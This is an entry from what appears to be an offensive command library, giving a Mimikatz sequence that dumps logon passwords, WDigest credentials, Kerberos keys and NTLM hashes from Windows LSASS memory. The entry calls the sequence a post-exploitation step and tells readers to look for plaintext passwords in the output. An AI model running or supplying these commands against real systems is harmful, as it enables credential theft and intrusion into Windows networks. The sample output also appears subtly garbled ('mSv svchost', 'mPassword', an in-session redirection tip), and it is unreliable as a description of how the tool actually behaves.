---
id: 42bb96b1-9c7d-464b-8e68-9191c2fbc491
name: mimikatz-interactive-password-extraction
type: command
executor: powershell
data: |-
  .\mimikatz.exe
  privilege::debug
  log
  sekurlsa::logonpasswords
  sekurlsa::wdigest
  exit
output: null
created_at: '2023-04-06T03:56:27.080443+00:00'
updated_at: '2023-04-10T20:37:17.351681+00:00'
platforms:
  - Windows
tags:
  - credential-access
  - mimikatz
verified: true
validated: true
---

# mimikatz-interactive-password-extraction

## Command

```powershell
PS C:\temp\mimikatz> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # log
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest
mimikatz # exit
```

## Description

This interactive command sequence launches Mimikatz to extract logon passwords and WDigest credentials from Windows memory. Use it in post-exploitation scenarios requiring detailed credential dumping with logging enabled.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| .\mimikatz.exe | Path to Mimikatz executable | Yes |
| privilege::debug | Elevates to debug privileges for LSASS access | Yes |
| log | Enables output logging to mimikatz.log | No |
| sekurlsa::logonpasswords | Dumps logon credentials from LSASS | Yes |
| sekurlsa::wdigest | Dumps WDigest-stored passwords | Yes |
| exit | Closes Mimikatz session | Yes |

## Examples

### Basic Usage

Run from an elevated PowerShell in the Mimikatz directory to dump all available credentials.

### Advanced Usage

Combine with output redirection: `sekurlsa::logonpasswords > creds.txt` inside the session for file export.

## Expected Output

Successful execution shows:

```
Privilege '20' OK
[*] Credentials
Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : Administrator
Domain            : DOMAIN
Logon Server      : DC01
Logon Time        : 10/4/2023 12:00:00 PM
SID               : S-1-5-21-...-500

	*mSv svchost : {0;123456}; 123456 <spn>
		Package   : Kerberos
		Key List  :
			Key  : 1:abcd1234efgh5678
			Key  : 18:deadbeef...

		Domain : DOMAIN ; NTLM : abc123 ; 31 : a1b2c3d4e5f6...
		mPassword : abc123
```

Look for plaintext 'mPassword' fields indicating success.

## Related

- [[procedures/Windows-Mimikatz-Password-Extraction]]
- [[tools/Mimikatz]]
